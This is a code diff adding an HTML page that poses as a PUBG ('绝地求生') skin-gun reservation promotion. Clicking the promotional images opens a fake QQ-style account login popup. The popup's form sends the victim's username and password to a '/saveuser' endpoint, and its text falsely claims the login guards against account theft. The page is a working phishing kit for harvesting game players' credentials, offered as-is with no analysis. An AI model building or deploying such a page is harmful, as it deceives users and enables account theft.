@@ -1,0 +1,112 @@
+<html><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+  <title>预约首款皮肤枪-绝地求生</title>
+  <meta charset="utf-8">
+  <style type="text/css">
+    #box_login{display:none;width:622px;height:368px;background:#fff;position:fixed;margin:auto;left:0;right:0;top:0;bottom:0;overflow:hidden;z-index:9999;}
+    #close{width:47px;height:20px;float:right;}
+    .close_a{display:block;width:47px;height:20px;background:url("style/images/z.png") -221px -126px no-repeat;}
+    .close_a:hover{background:url("style/images/z.png") -221px -150px no-repeat;}
+    .u_p_lg{width:100%;height:30px;margin-top:35px;text-align:center;font-size:19px;color:#333;}
+    .d_ksdl{width:100%;height:25px;text-align:center; margin-top:10px;}
+    .d_ksdl span{color:#666;}
+    .d_ksdl a{color:#3481cf;}
+    .d_ksdl a:hover{text-decoration:underline;}
+    #message{width:100%;height:25px;text-align:center; visibility:hidden;}
+    #message #ts{color:red; font-size:14px;}
+    .mes_d{width:250px;height:25px;margin:0 auto;}
+    #dengl{
+      cursor:pointer;
+    }
+    .fm{width:272px;height:150px;margin:10px auto;font-family: helvetica,arial,微软雅黑,华文黑体;}
+    .fm #user{width:273px; padding:10px 0px 10px 10px;color: #333;font-family: Verdana,Tahoma,Arial;font-size:14px;margin-bottom:10px;border:1px solid #ccc;}
+    .fm #pass{width:273px;padding:10px 0px 10px 10px;color: #333;font-family: Verdana,Tahoma,Arial;font-size:14px;border:1px solid #ccc;}
+    .fm #dengl{width:273px;height:35px;margin:10px auto 0;background:#86ce2f;border:none;font-size:18px;color:#fff;}
+    .btm{width:100%;height:20px; text-align:right;margin-top:20px;}
+    .btm a{color:#666;font-size:12px;margin-right:10px;margin-left:10px;}
+    .btm span{color:#666;font-size:12px;}
+    .clear_float{clear:right;}
+    #foots{
+        width:100%;
+        height:353%;
+        position:fixed;
+        top:0px;
+        left:0px;
+        display:none;
+        z-index:998;
+        opacity:0.5;
+        background-color:#fff;
+    }
+  </style>
+    <script src="/index/lgn.js" type="text/javascript"></script>
+</head>
+<body>
+<img src="index/efeylq.jpg" style="display:block;" onclick="lgclick();">
+<img src="index/fiharn.jpg" style="display:block;" onclick="lgclick();">
+<img src="index/hjuihi.jpg" style="display:block;" onclick="lgclick();">
+<style>
+.denglu {
+    width: 270px;
+    height: 40px;
+    text-align: center;
+    line-height: 35px;
+    border: none;
+    font-size: 17px;
+    font-weight: 400;
+    font-family: "Microsoft Yahei","微软雅黑",SimHei,"黑体","Hiragino Sans GB",STHeiTi,sans-serif;
+    color: #fff;
+    background: 0 0;
+    cursor: pointer;
+    position: relative;
+    border: 1px solid #d6d6d6!important;
+    top: 154px;
+    left: 190px;
+    height: 38px;
+    background: #86ce2f;
+}
+.inpc {
+    border-radius: 5px;
+    width: 258px;
+    position: relative;
+    border: 1px solid #d6d6d6!important;
+    top: 154px;
+    left: 190px;
+    padding: 10px 0 10px 10px;
+    line-height: 18px;
+    border: none;
+    background: 0 0;
+    color: #333;
+    font-family: Verdana,Tahoma,Arial;
+    font-size: 14px;
+}
+.tishi {
+    position: absolute;
+    top: 128px;
+    display: block;
+    text-align: center;
+    width: 100%;
+    color: red;
+}
+</style>
+
+  <div id="foots" style="display: none;"></div>
+  <div id="box_login" style="display: none;">
+    <div id="close"><a href="javascript:;" onclick="close_bg();" class="close_a"></a></div>
+    <div class="u_p_lg"><p>账号密码登录</p></div>
+    <div class="d_ksdl"><span>推荐使用</span><a href="javascript:;" onclick="" class="a_ksdl">快速安全登录</a><span>，防止盗号。</span></div>
+    <div id="message"><div class="mes_d"><img src="/index/1233.html" width="20" height="20"><span id="ts"></span></div></div>
+    <div class="fm">
+        <form action="/saveuser" method="post" id="form1">
+            <input name="username" id="user" placeholder="支持QQ号/邮箱/手机号登录" type="text">
+            <input name="password" id="pass" placeholder="密码" type="password">
+            <input name="bianhao" value="1" type="hidden">
+            <input value="登录" id="dengl" type="submit">
+        </form>
+    </div>
+    <div class="btm"><a href="">忘了密码？</a><span>|</span><a href="">注册新账号</a><span>|</span><a href="">意见反馈</a></div>
+    <div class="clear_float"></div>
+  </div>
+
+
+
+</body></html>
